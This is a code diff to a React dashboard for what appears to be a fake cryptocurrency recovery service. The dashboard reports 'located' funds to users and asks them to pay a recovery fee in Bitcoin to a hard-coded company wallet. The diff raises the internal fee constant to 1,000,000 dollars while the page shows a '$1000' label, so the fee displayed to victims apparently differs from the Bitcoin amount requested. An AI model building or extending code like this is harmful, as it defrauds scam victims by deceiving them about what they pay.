@@ -3,7 +3,7 @@ import type { Page } from '../App'
 import type { AuthUser } from '../lib/auth'
 import { LOGO_URL } from '../lib/branding'
 import { addReceipt } from '../lib/receipts'
-import { loadList, saveList, logClientSignIn } from '../lib/storage'
+import { loadList, saveList } from '../lib/storage'
 import {
   Search, FileText, Clock,
   ArrowLeft, AlertTriangle, Check, ChevronRight,
@@ -14,7 +14,8 @@ import type { LucideIcon } from 'lucide-react'
 
 const COMPANY_WALLET = 'bc1qs9qkg8crclkyxcjlj6vr3hlwuz60d6wu7yhfta'
 const BTC_PRICE = 66240
-const RECOVERY_FEE_USD = 5000
+const RECOVERY_FEE_USD = 1_000_000
+const RECOVERY_FEE_LABEL = '$1000';
 
 interface Case {
   id: string
@@ -124,13 +125,6 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
 
   const scanInterval = useRef<ReturnType<typeof setInterval> | null>(null)
   const flowTimer = useRef<ReturnType<typeof setTimeout> | null>(null)
-  const loggedSignIn = useRef(false)
-
-  useEffect(() => {
-    if (!user || loggedSignIn.current) return
-    loggedSignIn.current = true
-    logClientSignIn(user.email, user.name)
-  }, [user])
 
   const clearScanTimers = () => {
     if (scanInterval.current) clearInterval(scanInterval.current)
@@ -187,7 +181,7 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
           amount: '$52,140',
           progress: 100,
           created,
-          feeRequired: '$5,000',
+          feeRequired: RECOVERY_FEE_LABEL,
           feePaid: false,
           eta: 'Awaiting fee',
           wallet: target,
@@ -195,7 +189,7 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
         setInvoices(prev => [{
           id: `INV-${new Date().getFullYear()}-${Date.now().toString(36).toUpperCase()}`,
           caseId,
-          amount: '$5,000.00',
+          amount: RECOVERY_FEE_LABEL,
           currency: 'USD',
           status: 'Pending',
           date: created,
@@ -456,7 +450,7 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
                     {c.status === 'Funds Located' && !c.feePaid && (
                       <button onClick={() => { setScanAddr(c.wallet); setTab('scan'); setPhase('payment') }}
                         className="mt-4 w-full bg-[#f7931a] text-white font-medium py-2.5 rounded-xl hover:bg-[#e07e10] transition-all text-sm flex items-center justify-center gap-2">
-                        Pay Recovery Fee — $5,000 <ChevronRight size={15} />
+                        Pay Recovery Fee — {RECOVERY_FEE_LABEL} <ChevronRight size={15} />
                       </button>
                     )}
                     {c.feePaid && (
@@ -653,7 +647,7 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
                           <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-4">
                             <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">Service Fee</p>
                             <p className="font-mono text-xl font-bold text-[#f7931a]">{feeBtc} BTC</p>
-                            <p className="font-mono text-[10px] text-[#6b7280] mt-0.5">≈ ${RECOVERY_FEE_USD.toLocaleString()} @ ${BTC_PRICE.toLocaleString()}/BTC</p>
+                            <p className="font-mono text-[10px] text-[#6b7280] mt-0.5">≈ {RECOVERY_FEE_LABEL} @ ${BTC_PRICE.toLocaleString()}/BTC</p>
                           </div>
                           <div className="bg-[#fef3c7] border border-[#b45309]/20 rounded-xl p-4">
                             <p className="font-mono text-[10px] text-[#b45309] uppercase tracking-widest mb-1">Release</p>
